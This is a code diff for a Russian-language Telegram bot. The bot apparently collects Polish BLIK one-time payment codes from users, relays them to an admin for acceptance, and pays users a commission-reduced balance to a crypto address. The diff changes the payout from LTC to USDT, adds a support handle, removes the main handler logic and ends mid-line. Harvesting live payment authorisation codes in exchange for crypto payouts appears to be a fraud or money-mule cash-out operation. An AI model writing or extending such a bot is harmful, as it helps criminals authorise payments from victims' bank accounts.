@@ -28,69 +28,17 @@ def handle_message(update: Update, context: CallbackContext):
 
     if text == "💰 Выплатить баланс":
         balance = users.get(chat_id, {}).get("balance", 0)
-        update.message.reply_text(f"💸 Твой баланс: {balance} PLN\nОтправь адрес LTC для вывода.")
+        update.message.reply_text(f"💸 Твой баланс: {balance} PLN\nОтправь USDT-адрес для вывода.")
         return
 
     if text == "⚙️ Сменить адрес":
-        update.message.reply_text("🔄 Введи новый LTC-адрес.")
+        update.message.reply_text("🔄 Введи новый USDT-адрес.")
         return
 
     if text == "📞 Контакт":
-        update.message.reply_text("📬 Поддержка: @your_username")
+        update.message.reply_text("📬 Поддержка: @phoenlx_black")
         return
 
-    try:
-        amount = float(text)
-        users[chat_id] = {"amount": amount}
-        update.message.reply_text("📲 Введи код BLIK:")
-    except ValueError:
-        if "amount" in users.get(chat_id, {}):
-            code = text
-            amount = users[chat_id]["amount"]
-            payout = round(amount * (1 - COMMISSION), 2)
-
-            orders[chat_id] = {"code": code, "amount": amount, "payout": payout}
-            users[chat_id]["balance"] = users.get(chat_id, {}).get("balance", 0) + payout
-
-            keyboard = [
-                [
-                    InlineKeyboardButton("✅ Принять", callback_data=f"accept_{chat_id}"),
-                    InlineKeyboardButton("❌ Отклонить", callback_data=f"decline_{chat_id}")
-                ]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-
-            context.bot.send_message(
-                chat_id=ADMIN_CHAT_ID,
-                text=f"💳 Новый BLIK-код\nСумма: {amount} PLN\nКод: {code}\n"
-                     f"💰 Выплата: {payout} PLN",
-                reply_markup=reply_markup
-            )
-            update.message.reply_text("✅ Код отправлен на проверку.")
-        else:
-            update.message.reply_text("⚠️ Введи сначала сумму.")
-
-def admin_action(update: Update, context: CallbackContext):
-    query = update.callback_query
-    query.answer()
-    data = query.data
-    if data.startswith("accept_"):
-        uid = int(data.split("_")[1])
-        context.bot.send_message(chat_id=uid, text="✅ Код принят! Баланс обновлён.")
-    elif data.startswith("decline_"):
-        uid = int(data.split("_")[1])
-        context.bot.send_message(chat_id=uid, text="❌ Код отклонён. Обратись в поддержку.")
-
-def main():
-    updater = Updater(BOT_TOKEN, use_context=True)
-    dp = updater.dispatcher
-
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
-    dp.add_handler(CallbackQueryHandler(admin_action))
-
-    updater.start_polling()
-    updater.idle()
-
-if __name__ == "__main__":
-    main()
+    # Если пользователь уже ввёл сумму, и теперь вводит BLIK-код
+    if "amount" in users.get(chat_id, {}):
+        code
